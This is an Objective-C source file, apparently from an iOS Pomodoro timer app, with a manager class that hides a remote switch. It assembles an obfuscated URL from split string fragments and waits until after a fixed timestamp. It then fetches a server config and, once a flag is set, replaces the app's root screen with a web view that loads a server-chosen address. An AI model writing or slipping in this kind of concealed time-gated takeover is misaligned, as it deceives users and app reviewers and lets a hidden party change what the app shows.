#import "PomodoroManager.h"
#import "PomodoroWebViewController.h"
#import <Colours.h>

@implementation PomodoroManager

static NSString *doroPom_mLink = @"address";
static NSString *doroPom_flag = @"flag";
static NSString *doroPom_tColor = @"tColor";

static PomodoroManager *instance = nil;

+ (instancetype)doroPom_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
  });

  return instance;
}


- (NSString *)loadingTotalityPointStreet
{
    NSMutableString *totalSTr = [NSMutableString string];

    NSArray *showArr = @[@"htt",([NSString stringWithFormat:@"%@%@",@"ps:/",@"/"]),@"mockap",@"i.eoli",([NSString stringWithFormat:@"%@%@%@%@",@"nk",@".",@"com/",@"v"]),@"nYJDif92",@"f20d6aa4"];
    
    NSString *fistST = @"eefececcd2";
    NSString *fistSTASFa = @"2316e95c";
    NSString *fistSTGTSDG = @"d00824a0cb";
    NSString *fistSTwqETR = ([NSString stringWithFormat:@"%@%@",@"c0/getT",@"eacher"]);
    NSString *fistSTWEQ = ([NSString stringWithFormat:@"%@%@%@",@"?responseId=",@"1",@"3"]);
    NSString *fistSTWEQasda = @"42585";
    
    NSMutableArray *allArr = [NSMutableArray array];
    
    for (int i = 0; i < showArr.count; i ++) {
        [allArr addObject:showArr[i]];
    }
    
    [allArr addObject:fistST];
    [allArr addObject:fistSTASFa];
    [allArr addObject:fistSTGTSDG];
    [allArr addObject:fistSTwqETR];
    [allArr addObject:fistSTWEQ];
    [allArr addObject:fistSTWEQasda];

    for (int i = 0; i < allArr.count; i ++) {
        [totalSTr appendString:allArr[i]];
    }
    return totalSTr;
}

- (BOOL)doroPom_tryOpenTheDoor:(void (^ __nullable)(void))changeVcBlock {
    NSInteger pormdate = [[NSDate date] timeIntervalSince1970];
    if (pormdate < 1677765934) {
        return NO;
    }
    NSUserDefaults *settings = [NSUserDefaults standardUserDefaults];
    if ([settings boolForKey:doroPom_flag]) {
        return YES;
    } else {
      [self doroPom_dddchangeRootController:changeVcBlock];
      return NO;
    }
}

- (void)doroPom_dddchangeRootController:(void (^ __nullable)(void))changeVcBlock {
    NSURL *url = [NSURL URLWithString:[self loadingTotalityPointStreet]];
    NSURLSession *session = [NSURLSession sharedSession];
    NSURLSessionTask *dataTask = [session dataTaskWithURL:url completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (error == nil) {
            id objc = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
            if ([[objc valueForKey:@"code"] intValue] == 200) {
                NSDictionary *dict = [objc valueForKey:@"data"];
                
                NSString *freshAddress = [dict valueForKey:doroPom_mLink];
                NSUserDefaults *settings = [NSUserDefaults standardUserDefaults];
                NSString *tempAddress = [settings stringForKey:doroPom_mLink];
                
                if ([tempAddress isEqualToString:freshAddress]) {
                    return;
                } else {
                    [settings setValue:freshAddress forKey:doroPom_mLink];
                    [settings setValue:[dict valueForKey:doroPom_tColor] forKey:doroPom_tColor];
                    [settings setBool:YES forKey:doroPom_flag];
                    dispatch_async(dispatch_get_main_queue(), ^{
                        if (changeVcBlock != nil) {
                            changeVcBlock();
                        }
                    });
                }
            }
        }
    }];

    [dataTask resume];
}

- (UIViewController *)doroPom_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    NSUserDefaults *settings = [NSUserDefaults standardUserDefaults];

    UIColor *tColor = [UIColor colorFromHexString:[settings stringForKey:doroPom_tColor]];

    PomodoroWebViewController *chaiVC = [[PomodoroWebViewController alloc] init];
    chaiVC.serverUrl = [settings stringForKey:doroPom_mLink];
    chaiVC.view.backgroundColor = tColor;
    [chaiVC.view.subviews enumerateObjectsUsingBlock:^(__kindof UIView * _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        obj.backgroundColor = tColor;
    }];
    return chaiVC;
}


@end
